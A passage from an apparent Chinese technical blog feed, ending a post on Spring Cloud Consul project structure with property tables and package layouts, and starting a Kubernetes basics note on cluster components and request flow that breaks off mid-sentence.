class="hljs-symbol">/actuator/health</span> <span class="hljs-comment"># 健康检查路径 [22, 28, 29, 35, 37, 38]</span><br>        <span class="hljs-params">healthCheckInterval:</span> <span class="hljs-number">15</span>s <span class="hljs-comment"># 健康检查间隔 [22, 28, 29, 35, 37, 38]</span><br>        <span class="hljs-params">metadata:</span><br>          <span class="hljs-params">version:</span> v1 <span class="hljs-comment"># 可选：添加元数据 [29, 35, 37]</span><br></code></pre></td></tr></table></figure><p>Consul 默认会自动创建一个 HTTP 健康检查，每 10 秒访问已注册服务的 <code>/health</code> 端点 35。如果应用程序使用非默认的上下文路径，可以使用 <code>spring.cloud.consul.discovery.healthCheckPath</code> 自定义健康检查路径 22。可以使用 <code>spring.cloud.consul.discovery.healthCheckInterval</code> 配置健康检查间隔 22。可以使用 <code>spring.cloud.consul.discovery.metadata</code> 或 <code>spring.cloud.consul.discovery.tags</code> 向服务注册添加元数据 29。</p><p><strong>添加通用配置和实用程序</strong></p><p>为了进一步完善项目结构，需要考虑添加通用配置和实用程序。可以将跨多个模块共享的配置放在 Consul Config 的默认上下文中 (<code>/config/application</code>) 23。另一种方法是创建一个专用的 “config” 模块，其中包含通用的配置类，并将其作为依赖项包含在其他模块中。</p><p>对于可重用的实用程序类和辅助函数，建议创建一个单独的模块（例如 <code>common-utils</code>）2。这有助于提高代码重用率并减少模块之间的重复代码。创建一个单独的库模块来存放公共服务和实用程序是多模块项目中的良好实践 2。</p><p>应该实现一致且集中的异常处理方法，可以在 <code>application</code> 模块中使用全局异常处理程序，也可以在每个模块的 <code>exception</code> 包中实现 6。确保应用程序返回一致的错误响应格式。此外，应该标准化所有模块的日志记录，可以在父 POM 或专用配置模块中配置通用的日志记录框架（例如 SLF4j with Logback）20。</p><p><strong>构建和测试的最佳实践</strong></p><p>在多模块项目中，优化构建过程至关重要。Maven 或 Gradle 的构建配置文件应该定义模块的构建顺序（如果需要）。可以使用 Maven profiles 或 Gradle build variants 来针对不同的环境进行构建。Spring Boot Maven 插件和 Gradle 插件用于打包和运行 Spring Boot 应用程序 2。Maven 和 Gradle 都提供了管理多模块项目的构建配置的方法 1。</p><p>自动化测试对于确保每个模块的质量至关重要。每个模块都应该包含单元测试、集成测试和端到端测试 4。测试源代码应该放在每个模块的单独测试源目录 (<code>src/test/java</code>) 中。如果依赖模块在测试期间需要测试实用程序或数据，可以为模块创建单独的测试 JAR 4。</p><p><strong>文档</strong></p><p>清晰全面的文档对于每个模块和整个项目都是必不可少的 3。应该记录每个模块的用途、依赖关系和主要功能。对于 REST API，建议使用 Swagger (OpenAPI) 等工具进行文档化。</p><p><strong>结论</strong></p><p>通过采纳这些最佳实践，可以将提供的基本 Spring Cloud 项目结构增强为一个成熟且健壮的架构。选择与项目特定需求相符的模块组织策略（DDD 或技术分层）至关重要。实施集中式配置和服务发现（使用 Spring Cloud Consul）可以提高应用程序的可维护性、可伸缩性和弹性。添加通用配置和实用程序模块可以促进代码重用并确保跨应用程序的一致性。最后，采用全面的构建和测试策略以及提供清晰的文档对于项目的长期成功至关重要。随着应用程序的发展，持续改进和调整项目结构也是至关重要的 4。</p><p><strong>附录：推荐的包结构</strong></p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>包名</strong></td><td><strong>描述&#x2F;职责</strong></td></tr><tr><td><code>controller</code></td><td>处理传入的 HTTP 请求并返回响应。</td></tr><tr><td><code>service</code></td><td>包含业务逻辑。通常包含 <code>inter</code> 子包（接口定义）和 <code>impl</code> 子包（接口实现）。</td></tr><tr><td><code>repository</code></td><td>管理数据访问和持久化操作。</td></tr><tr><td><code>model</code></td><td>定义应用程序的数据结构。通常包含 <code>entity</code> 子包（JPA 实体）、<code>dto</code> 子包（数据传输对象）和 <code>vo</code> 子包（视图对象）。</td></tr><tr><td><code>config</code></td><td>包含应用程序特定的配置类，例如数据库配置、安全配置等。</td></tr><tr><td><code>util</code></td><td>包含可重用的实用程序类和辅助函数。</td></tr><tr><td><code>exception</code></td><td>定义应用程序特定的自定义异常类，用于更好的错误处理。</td></tr><tr><td><code>security</code></td><td>管理应用程序的身份验证和授权逻辑。</td></tr><tr><td><code>validation</code></td><td>实现数据验证规则，例如使用 Bean Validation API。</td></tr></tbody></table><p><strong>附录：常用 Spring Cloud Consul 配置属性</strong></p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>属性名</strong></td><td><strong>描述</strong></td><td><strong>示例值</strong></td><td><strong>配置文件</strong></td></tr><tr><td><code>spring.cloud.consul.host</code></td><td>Consul 代理的主机名或 IP 地址。</td><td><code>localhost</code>, <code>192.168.1.100</code></td><td><code>bootstrap.yml</code></td></tr><tr><td><code>spring.cloud.consul.port</code></td><td>Consul 代理的端口号（默认为 8500）。</td><td><code>8500</code></td><td><code>bootstrap.yml</code></td></tr><tr><td><code>spring.config.import</code></td><td>启用 Consul 配置导入（Spring Boot 2.4+）。</td><td><code>consul:</code></td><td><code>application.yml</code></td></tr><tr><td><code>spring.cloud.consul.config.enabled</code></td><td>启用 Consul 配置（较旧版本）。</td><td><code>true</code>, <code>false</code></td><td><code>bootstrap.yml</code></td></tr><tr><td><code>spring.cloud.consul.config.format</code></td><td>Consul 中配置数据的格式。</td><td><code>YAML</code>, <code>PROPERTIES</code></td><td><code>bootstrap.yml</code></td></tr><tr><td><code>spring.cloud.consul.config.data-key</code></td><td>保存 YAML&#x2F;Properties 数据的 Key。</td><td><code>data</code></td><td><code>bootstrap.yml</code></td></tr><tr><td><code>spring.cloud.consul.config.fail-fast</code></td><td>如果 Consul 不可用，是否停止应用程序启动。</td><td><code>true</code>, <code>false</code></td><td><code>bootstrap.yml</code></td></tr></tbody></table><p><strong>附录：常用 Spring Cloud Consul 服务发现配置属性</strong></p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>属性名</strong></td><td><strong>描述</strong></td><td><strong>示例值</strong></td><td><strong>配置文件</strong></td></tr><tr><td><code>spring.cloud.consul.discovery.enabled</code></td><td>启用服务发现。</td><td><code>true</code>, <code>false</code></td><td><code>bootstrap.yml</code></td></tr><tr><td><code>spring.application.name</code></td><td>应用程序的名称，用于在 Consul 中注册服务。</td><td><code>user-service</code>, <code>order-service</code></td><td><code>bootstrap.yml</code></td></tr><tr><td><code>spring.cloud.consul.discovery.instanceId</code></td><td>服务的唯一实例 ID。</td><td><code>$&#123;spring.application.name&#125;:$&#123;random.value&#125;</code></td><td><code>bootstrap.yml</code></td></tr><tr><td><code>spring.cloud.consul.discovery.prefer-ip-address</code></td><td>是否注册服务的 IP 地址而不是主机名。</td><td><code>true</code>, <code>false</code></td><td><code>bootstrap.yml</code></td></tr><tr><td><code>spring.cloud.consul.discovery.healthCheckPath</code></td><td>Consul 执行健康检查的端点路径。</td><td><code>$&#123;management.server.servlet.context-path&#125;/actuator/health</code></td><td><code>bootstrap.yml</code></td></tr><tr><td><code>spring.cloud.consul.discovery.healthCheckInterval</code></td><td>Consul 执行健康检查的时间间隔。</td><td><code>15s</code>, <code>1m</code></td><td><code>bootstrap.yml</code></td></tr><tr><td><code>spring.cloud.consul.discovery.metadata.version</code></td><td>附加到服务注册的元数据。</td><td><code>v1</code>, <code>v2</code></td><td><code>bootstrap.yml</code></td></tr></tbody></table><h1 id="——"><a href="#——" class="headerlink" title="——-"></a>——-</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.myproject</span>  <br>├── Application<span class="hljs-selector-class">.java</span>                             <span class="hljs-comment">// 启动类，包含 main 方法  </span><br>├── config                                       <span class="hljs-comment">// 配置类  </span><br>│   ├── SecurityConfig<span class="hljs-selector-class">.java</span>  <br>│   ├── DataSourceConfig<span class="hljs-selector-class">.java</span>  <br>│   └── AppConfig<span class="hljs-selector-class">.java</span>  <br>├── controller                                   <span class="hljs-comment">// 控制器层</span><br>│   ├── StudentController<span class="hljs-selector-class">.java</span>  <br>│   └── ScoreController<span class="hljs-selector-class">.java</span>  <br>├── service                                      <span class="hljs-comment">// 业务层</span><br>│   ├── inter                                    <span class="hljs-comment">// 服务接口  </span><br>│   │   ├── StudentService<span class="hljs-selector-class">.java</span>  <br>│   │   └── ScoreService<span class="hljs-selector-class">.java</span>  <br>│   └── impl                                     <span class="hljs-comment">// 服务实现  </span><br>│       ├── StudentServiceImpl<span class="hljs-selector-class">.java</span>  <br>│       └── ScoreServiceImpl<span class="hljs-selector-class">.java</span>  <br>├── repository                                   <span class="hljs-comment">// 仓库层，处理数据库交互  </span><br>│   ├── StudentRepository<span class="hljs-selector-class">.java</span>  <br>│   └── ScoreRepository<span class="hljs-selector-class">.java</span>  <br>├── model                                        <span class="hljs-comment">// 模型层，包含实体、DTO 和 VO  </span><br>│   ├── entity                                   <span class="hljs-comment">// 实体类，映射数据库表  </span><br>│   │   ├── Student<span class="hljs-selector-class">.java</span>  <br>│   │   └── Score<span class="hljs-selector-class">.java</span>  <br>│   ├── dto                                      <span class="hljs-comment">// 数据传输对象，服务间数据传递  </span><br>│   │   ├── StudentDTO<span class="hljs-selector-class">.java</span>  <br>│   │   └── ScoreDTO<span class="hljs-selector-class">.java</span>  <br>│   └── vo                                       <span class="hljs-comment">// 视图对象，前端展示数据  </span><br>│       ├── StudentVO<span class="hljs-selector-class">.java</span>  <br>│       └── ScoreVO<span class="hljs-selector-class">.java</span>  <br>├── util                                         <span class="hljs-comment">// 工具类，包含常用工具  </span><br>│   ├── DateUtils<span class="hljs-selector-class">.java</span>  <br>│   ├── StringUtils<span class="hljs-selector-class">.java</span>  <br>│   └── EncryptionUtils<span class="hljs-selector-class">.java</span>  <br>├── exception                                    <span class="hljs-comment">// 自定义异常类  </span><br>│   └── CustomException<span class="hljs-selector-class">.java</span>  <br>└── common                                       <span class="hljs-comment">// 通用工具和常量  </span><br>    ├── Constants<span class="hljs-selector-class">.java</span>  <br>    └── CommonUtils<span class="hljs-selector-class">.java</span>  <br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Spring_Data_MySQL<br>├── <span class="hljs-attribute">src</span><br>│   └── <span class="hljs-selector-tag">main</span><br>│       ├── java<br>│       │   └── com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.spring_data_mybatis</span><br>│       │       ├── Application<span class="hljs-selector-class">.java</span>                          <span class="hljs-comment">// 项目启动类</span><br>│       │       ├── config<br>│       │       │   └── mapper<br>│       │       │       ├── DataSource1Config<span class="hljs-selector-class">.java</span>            <span class="hljs-comment">// 数据源1配置类</span><br>│       │       │       └── DataSource2Config<span class="hljs-selector-class">.java</span>            <span class="hljs-comment">// 数据源2配置类</span><br>│       │       ├── mapper                                    <span class="hljs-comment">// 或者是 DAO</span><br>│       │       │   ├── datasource1<br>│       │       │   │   └── UserMapper<span class="hljs-selector-class">.java</span>                   <span class="hljs-comment">// UserMapper 接口（数据源1下）</span><br>│       │       │   └── datasource2<br>│       │       │       └── CarMapper<span class="hljs-selector-class">.java</span>                    <span class="hljs-comment">// CarMapper 接口（数据源2下）</span><br>│       │       ├── model<br>│       │       │   └── entity<br>│       │       │       ├── datasource1<br>│       │       │       │   └── User<span class="hljs-selector-class">.java</span>                     <span class="hljs-comment">// User 实体类（数据源1下）</span><br>│       │       │       └── datasource2<br>│       │       │           └── Car<span class="hljs-selector-class">.java</span>                      <span class="hljs-comment">// Car 实体类（数据源2下）</span><br>│       │       ├── service<br>│       │       │   ├── datasource1<br>│       │       │   │   ├── UserService<span class="hljs-selector-class">.java</span>                  <span class="hljs-comment">// UserService 接口（数据源1下）</span><br>│       │       │   │   └── UserServiceImpl<span class="hljs-selector-class">.java</span>              <span class="hljs-comment">// UserService 实现类</span><br>│       │       │   └── datasource2<br>│       │       │       ├── CarService<span class="hljs-selector-class">.java</span>                   <span class="hljs-comment">// CarService 接口（数据源2下）</span><br>│       │       │       └── CarServiceImpl<span class="hljs-selector-class">.java</span>               <span class="hljs-comment">// CarService 实现类</span><br>│       │       └── controller<br>│       │           └── TestController<span class="hljs-selector-class">.java</span>                   <span class="hljs-comment">// TestController 类</span><br>│       └── resources<br>│           └── mapper<br>│               ├── datasource1<br>│               │   └── UserMapper<span class="hljs-selector-class">.xml</span>                        <span class="hljs-comment">// MyBatis 映射文件（数据源1下）</span><br>│               └── datasource2<br>│                   └── CarMapper<span class="hljs-selector-class">.xml</span>                         <span class="hljs-comment">// MyBatis 映射文件（数据源2下）</span><br></code></pre></td></tr></table></figure><h3 id="2、多个模块"><a href="#2、多个模块" class="headerlink" title="2、多个模块"></a>2、多个模块</h3><p>在 Spring Boot 项目中，可以创建多个模块，并将它们作为子包组织在根包下。每个子包中可以按照“单一模块”结构进行定义，保持模块的独立性和可维护性。项目结构示例如下：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">com.example.根包<br>|<span class="hljs-string">-- module1               // 第一个模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- Application.java  // 启动类</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- controller        // 控制器层</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- StudentController.java</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- ScoreController.java</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- service           // 业务层</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- inter         // 业务层接口</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- impl          // 接口实现包</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- repository        // 持久层</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- model             // 模型层</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- entity        // 实体类</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- dto           // 数据传输对象</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- vo            // 视图对象</span><br><span class="hljs-string"></span>|<span class="hljs-string">-- module2               // 第二个模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- Application.java  // 启动类</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- controller        // 控制器层</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- service           // 业务层</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- repository        // 持久层</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- model             // 模型层</span><br><span class="hljs-string"></span>|<span class="hljs-string">-- module3               // 第三个模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- Application.java  // 启动类</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- controller        // 控制器层</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- service           // 业务层</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- repository        // 持久层</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- model             // 模型层</span><br><span class="hljs-string"></span>|<span class="hljs-string">-- application           // 通用配置或工具包</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- config            // 配置文件</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- util              // 工具类</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java 基础</category>
      
      <category>Java 项目创建和结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Kubernetes 基础</title>
    <link href="/2025/03/12/%E7%AC%94%E8%AE%B0%EF%BC%9AKubernetes%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/03/12/%E7%AC%94%E8%AE%B0%EF%BC%9AKubernetes%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-导图：Map：K8S"><a href="#1-导图：Map：K8S" class="headerlink" title="1. 导图：Map：K8S"></a>1. 导图：<a href="Map%EF%BC%9AK8S.xmind">Map：K8S</a></h3><hr><h3 id="2-K8S-概述"><a href="#2-K8S-概述" class="headerlink" title="2. K8S 概述"></a>2. K8S 概述</h3><p>K8S 是 <strong>Kubernetes</strong> 的缩写（中间的 “8” 代表 “ubernete” 这 8 个字母），它是目前最流行的<strong>容器编排系统</strong>，用于自动化部署、扩展和管理容器化应用（如 Docker 容器）</p><hr><h3 id="3-K8S-组件"><a href="#3-K8S-组件" class="headerlink" title="3. K8S 组件"></a>3. K8S 组件</h3><p>我们说 K8S 实际上就是指的 K8S 集群，其组件分 Master 节点和 Worker 节点：</p><ol><li>&#x3D;&#x3D;Master 节点&#x3D;&#x3D;<ol><li><font color="#00b0f0">containerd（☆☆☆）</font>:<ol><li>容器运行时，负责管理<strong>本机容器</strong>的生命周期，例如拉取镜像、启动和停止容器。</li></ol></li><li><font color="#00b0f0">crictl</font>：<ol><li>K8S 提供的容器运行时的命令行工具，用于与 containerd 交互，常用于调试容器。例如，<code>crictl ps</code> 查看容器状态，<code>crictl pull</code> 拉取镜像。</li></ol></li><li><font color="#00b0f0">kubeadm</font>：<ol><li>用于简化 Kubernetes 集群的初始化和管理。例如，<code>kubeadm init</code> 初始化集群，<code>kubeadm join</code> 添加新节点。</li></ol></li><li><font color="#00b0f0">kubelet（☆☆☆）</font>：<ol><li>kubelet 负责创建和运行 Pod，它会监听 etcd 的变更，当 Kubernetes 调度 Pod 至本节点时，<code>kubelet</code> 通过 <code>containerd</code> 启动容器，并确保其持续运行。</li></ol></li><li><font color="#00b0f0">kubectl</font>：<ol><li>命令行工具，用于与 API Server 交互。例如，<code>kubectl get pods</code> 查看集群中的 Pods。</li></ol></li><li><font color="#00b0f0">calico-kube-controllers</font>：<ol><li>Calico 控制器，负责管理网络策略和 IP 地址分配。</li></ol></li><li><font color="#00b0f0">etcd（☆☆☆）</font>：<ol><li>分布式键值存储，保存 Kubernetes 集群的所有配置和状态。例如，你创建 Deployment、Pod、Service，它们的配置信息都会存入 etcd，并在多个 Master 节点间保持一致。</li></ol></li><li><font color="#00b0f0">kube-apiserver（☆☆☆）</font>：<ol><li><font color="#7030a0">处理 kubectl 命令</font>：<ol><li>接收并处理所有 <code>kubectl</code> 命令</li></ol></li><li><font color="#7030a0">进行认证（☆☆☆）</font>：<ol><li>根据执行 <code>kubectl</code> 命令时传递的 <code>Service Account</code> 或 用户证书，进行用户的身份验证认证</li><li>如果认证通过，则继续执行后续操作（如鉴权、操作 etcd、推送变更等）</li><li>如果认证失败，则返回 401 错误。</li></ol></li><li><font color="#7030a0">进行鉴权（☆☆☆）</font>：<ol><li>根据我们使用 RBAC 为 <code>Service</code> 或 用户证书绑定的用户，判断他是否有权限执行这个 kubectl 命令</li><li>如果没有该权限，返回 403 错误</li></ol></li><li><font color="#7030a0">与 etcd 交互</font>：<ol><li>API Server 对 etcd 进行增删改查操作，例如读取 Deployment 配置或更新 Service 状态</li><li>在进行写入或修改操作（例如更新 Pod、Service 或 Controller 配置）时，API Server 会先将配置转换成 JSON 格式，然后写入 etcd</li></ol></li><li><font color="#7030a0">推送变更</font>：<ol><li>当 etcd 中的数据发生变更时，API Server 通过 Watch 机制向 Controller Manager、Scheduler 和 Kubelet 推送事件。</li><li>需要注意的是，API Server 不会主动”通知组件”，而是组件主动监听 API Server 的资源变更。</li></ol></li></ol></li><li><font color="#00b0f0">kube-controller-manager（☆☆☆）</font>：<ol><li>负责运行和管理各个 Controller</li><li>Controller 监听 <code>etcd</code> 变更，并通过 Scheduler 和 Kubelet 管理 Pod 的生命周期，确保集群中始终保持指定数量的运行 Pod：<ol><li>在 Pod 故障时，自动重启 Pod</li><li>当 节点 故障时，触发 Pod 迁移</li></ol></li></ol></li><li><font color="#00b0f0">kube-scheduler（☆☆☆）</font>：<ol><li>监听 API Server，检测是否有待调度的 Pod。</li><li>如果存在待调度 Pod，Scheduler 根据资源需求（如 CPU&#x2F;内存）、亲和性（<code>nodeAffinity</code>）、污点（<code>Taint</code>）等策略选择目标 Worker 节点。</li><li>确定目标节点后，<code>kube-scheduler</code> 将 Pod 的 <code>nodeName</code> 字段更新，并写入 etcd。当 kubelet 监听到 etcd biang后，调用 <code>containerd</code> 创建容器并运行 Pod。</li></ol></li><li><font color="#00b0f0">kube-proxy</font>：<ol><li>负责 Kubernetes 内部的<strong>网络路由</strong>和<strong>服务负载均衡</strong>，实现 Service 的 IP 和端口映射，确保流量正确转发到目标 Pod。例如，你访问<code>ClusterIP</code>，流量会被 kube-proxy 代理到实际的 Pod</li></ol></li><li><font color="#00b0f0">coredns</font>：<ol><li>Kubernetes 内部的 DNS 服务器，提供<strong>服务发现</strong>。例如，Pod 访问 <code>my-service.default.svc.cluster.local</code>，CoreDNS 解析其 IP 地址。</li></ol></li></ol></li><li>&#x3D;&#x3D;Worker 节点&#x3D;&#x3D;<ol><li><font color="#00b0f0">containerd</font></li><li><font color="#00b0f0">crictl</font></li><li><font color="#00b0f0">kubeadm</font></li><li><font color="#00b0f0">kubelet</font></li><li><font color="#00b0f0">kubectl</font></li><li><font color="#00b0f0">calico-node</font></li></ol></li></ol><hr><h3 id="4-K8S-最佳实践"><a href="#4-K8S-最佳实践" class="headerlink" title="4. K8S 最佳实践"></a>4. K8S 最佳实践</h3><h4 id="4-1-高可用实现"><a href="#4-1-高可用实现" class="headerlink" title="4.1. 高可用实现"></a>4.1. 高可用实现</h4><ol><li>&#x3D;&#x3D;主从之间&#x3D;&#x3D;<ol><li>K8S 采用主从架构，是主控制从的架构，Master 节点负责全局调度和决策，而 Worker 节点负责执行具体的任务</li><li>K8S 不支持 Worker 上位 Master</li></ol></li><li>&#x3D;&#x3D;主主之间&#x3D;&#x3D;<ol><li>多个主节点之间通过 <code>etcd</code> 实现信息同步，保证每个主节点都能及时获取到集群的最新状态信息。</li><li>主节点之间会通过会通过 <strong>Raft 算法</strong>选举出一个 <strong>Leader</strong>，只有 Leader 的各项组件（如 API Server、Scheduler 等）真正起作用，其他主节点的组件不起作用。这主要是为了避免多个主节点同时操作 etcd，重复调度 Pod，导致冲突，当 Leader 挂掉之后，会重新选举新的 Leader</li></ol></li><li>&#x3D;&#x3D;负载均衡&#x3D;&#x3D;<ol><li>使用 Keepalived 为 Haproxy 绑定 VIP，并使用 Haproxy 负载均衡到 Master，确保每个 Master 都有执行管理员命令的权利</li></ol></li></ol><hr><h4 id="4-2-流程图"><a href="#4-2-流程图" class="headerlink" title="4.2. 流程图"></a>4.2. 流程图</h4><h5 id="4-2-1-用户访问应用（通过浏览器）"><a href="#4-2-1-用户访问应用（通过浏览器）" class="headerlink" title="4.2.1. 用户访问应用（通过浏览器）"></a>4.2.1. 用户访问应用（通过浏览器）</h5><ol><li>&#x3D;&#x3D;用户请求&#x3D;&#x3D;：<ol><li>用户在浏览器中输入请求地址，例如 <code>blog.wagnjia.xin</code>。</li></ol></li><li>&#x3D;&#x3D;公共 DNS 服务器处理&#x3D;&#x3D;：<ol><li>请求首先到达公共 DNS 服务器，DNS 将域名解析为由 MetalLB 分配给 <code>Ingress Controller Service</code> 的 VIP 地址</li></ol></li><li>&#x3D;&#x3D;请求到达 Ingress Controller Serviece&#x3D;&#x3D;:<ol><li>用户请求通过解析得到的 VIP 地址被路由到 <code>Ingress Controller Service</code>。</li></ol></li><li>&#x3D;&#x3D;请求到达 Ingress Controller Pod&#x3D;&#x3D;：<ol><li><code>Ingress Controller Service</code> 根据负载均衡策略，将请求分发到某个 <code>Ingress Controller Pod</code> 实例</li></ol></li><li>&#x3D;&#x3D;请求到达 应用 Service&#x3D;&#x3D;：<ol><li><code>Ingress Controller Pod</code> 会按照 <code>Ingress</code> 资源配置的域名规则，将请求发送到相应的 应用 Service</li></ol></li><li>&#x3D;&#x3D;请求到达 应用 Pod&#x3D;&#x3D;：<ol><li>应用 Service 接受到请求后，会把请求负载均衡到一个其管理的应用 Pod 实例</li></ol></li><li>&#x3D;&#x3D;应用 Pod 完成业务处理&#x3D;&#x3D;：<ol><li>然后，将由应用 Pod 完成真正的业务处理<pre class="mermaid">graph TD A[用户请求] --> B["公共 DNS"] B -->|"DNS 解析出 VIP(由 MetalLB 为 LoadBalancer Service 提供)"| C["VIP"] C -->|"VIP 绑定在 Ingress Controller Service"| D["Ingress Controller Service(LoadBalancer 类型)"] D -->|"将流量转发至其 Pod"| E["Ingress Controller Pod"] E -->|"根据 Ingress 规则将流量转发至应用 Service"| F["应用 Service"] F -->|"将流量负载均衡至其 Pod"| G[应用 Pod] G --> H["应用 Pod 完成业务处理"]</pre></li></ol></li></ol><hr><h5 id="4-2-2-管理员执行命令（Master-终端-管理机终端）"><a href="#4-2-2-管理员执行命令（Master-终端-管理机终端）" class="headerlink" title="4.2.2. 管理员执行命令（Master 终端 &#x2F; 管理机终端）"></a>4.2.2. 管理员执行命令（Master 终端 &#x2F; 管理机终端）</h5><ol><li>&#x3D;&#x3D;管理员执行命令&#x3D;&#x3D;<ol><li>管理员在 Master 节点的终端执行 <code>kubectl</code> 命令，该命令会读取本机 <code>~/.kube/admin.conf</code> 中的 <code>API Server</code> 字段，以定位本机的 API Server，通常是由 Keepalived 提供的 VIP（<code>192.168.136.100</code>）。</li><li><code>admin.conf</code> 会自动携带用户证书，并将请求发送至 API Server。（<code>admin.conf</code> 默认的用户证书是由 <code>kubeadm</code> 在初始化集群时自动生成，拥有最高权限，可操作集群中的所有资源。）</li><li>注意：虽然 <code>kubeadm</code> 在 <code>/etc/kubernetes/</code> 下生成了 <code>admin.conf</code>，但 <code>kubectl</code> 实际使用的是 <code>~/.kube/</code> 下的 <code>admin.conf</code>。前者更像是一个模板，供管理员配置使用。</li></ol></li><li>&#x3D;&#x3D;命令到达 Haproxy&#x3D;&#x3D;：<ol><li>由于 <code>admin.conf</code> 指定的 VIP（<code>192.168.136.100</code>）通常绑定在 HAProxy 服务器上，因此命令会先到达 HAProxy。</li></ol></li><li>&#x3D;&#x3D;命令到达 Master&#x3D;&#x3D;<ol><li>HAProxy 负责将请求负载均衡至某个 Master 节点，并转发至 Kubernetes API Server 监听的 <code>6443</code> 端口。</li></ol></li><li>&#x3D;&#x3D;命令到达 API Server&#x3D;&#x3D;：<ol><li>目标 Master 节点上的 API Server 接收请求，并通过 <code>6443</code> 端口进行处理。</li><li>API Server 验证用户证书的有效性，并检查权限，完成认证与鉴权。</li></ol></li><li>&#x3D;&#x3D;API Server 与 etcd 交互&#x3D;&#x3D;<ol><li>API Server 通过 etcd 客户端库，将请求操作（如资源创建、更新）写入 etcd 分布式数据库集群。</li></ol></li><li>&#x3D;&#x3D;组件响应 etced 